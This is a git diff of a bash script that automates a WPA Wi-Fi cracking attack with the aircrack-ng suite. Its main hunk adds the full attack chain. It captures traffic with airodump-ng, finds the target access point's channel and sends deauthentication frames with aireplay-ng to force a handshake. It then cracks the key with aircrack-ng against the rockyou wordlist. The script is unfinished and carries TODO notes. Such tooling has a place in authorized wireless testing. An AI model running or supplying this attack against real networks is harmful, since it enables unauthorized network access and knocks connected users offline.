@@ -8,6 +8,7 @@
 obtain_interface (){
 	INTERFACE="$(iw dev | awk '$1=="Interface" {print $2}')"
 
+	clear
 	echo "Now obtaining wireless interface name."
 	sleep 1
 
@@ -18,6 +19,7 @@ obtain_interface (){
 	fi
 
 	echo Wireless interface detected with name: $INTERFACE
+	sleep 1
 }
 
 #changes wireless interface to monitor mode
@@ -51,6 +53,7 @@ show_intro (){
 
 #main menu
 show_main_menu (){
+	clear
 	printf "\n"
 	echo "-----------------"
 	echo " Main Menu"
@@ -63,22 +66,45 @@ show_main_menu (){
 }
 
 crunch_attack () {
-	local APMAC CH TEMPPID
+	local APMAC CLMAC CH TEMPPID CHOICE HSHAKE
 
 	clear
 	echo Now starting crunch attack...
 	sleep 2
 
-	read -p "Enter MAC Address of AP: " APMAC
+	x-terminal-emulator -e "airodump-ng -w dumpfiles/dump $INTERFACE" &
 
-	x-terminal-emulator -e "airodump-ng -w temp $INTERFACE" &
-	
-	#kill the proccess above after the sleep
-	sleep 5
+	echo "Now attempting to capture packets..."
+	sleep 2
+	read -p "Enter BSSID of target access point: " APMAC
+	sleep 1
+	read -p "Enter client (STATION) address (optional): " CLMAC
+	sleep 1
 
-	CH=$(awk -F "\"*, \"*" '$1=="'$APMAC'" {print $4}' temp-01.csv)
-        echo $CH
+	echo "Retrieving $APMAC channel..."
+	sleep 1
+
+	TEMPPID=`ps -ef | grep "\bairodump-ng -w dumpfiles/dump $INTERFACE\b" | awk '{print $2}'`
+	CH=$(awk -F "\"*, \"*" '$1=="'$APMAC'" {print $4}' dumpfiles/dump-01.csv)
+        echo "Access point found on channel: $CH"
+
+	kill 15 $TEMPPID
+
+	echo "Reattempting to capture packets on channel $CH..."
+	x-terminal-emulator -e "airodump-ng -w crackfiles/psk -c $CH $INTERFACE" &
+
+	sleep 2
+
+	#FIND OUT HOW TO SEE IF HANDSHAKE WAS FOUND
+	#solution: look at aircrack output: says no handshake found
+		echo "Attempting to get WPA handshake on $APMAC..."
+        	aireplay-ng -0 10 -a $APMAC -c $CLMAC $INTERFACE
+		sleep 2
+	        aircrack-ng -w /usr/share/wordlists/rockyou.txt.gz -b $APMAC crackfiles/psk*.cap > output.txt
+
+		#grep output.txt!!!!!! with "handshake" use the psk file psk-01 which doesnt have handshake for testing!
 }
+
 
 #read main menu choice
 read_main_menu () {
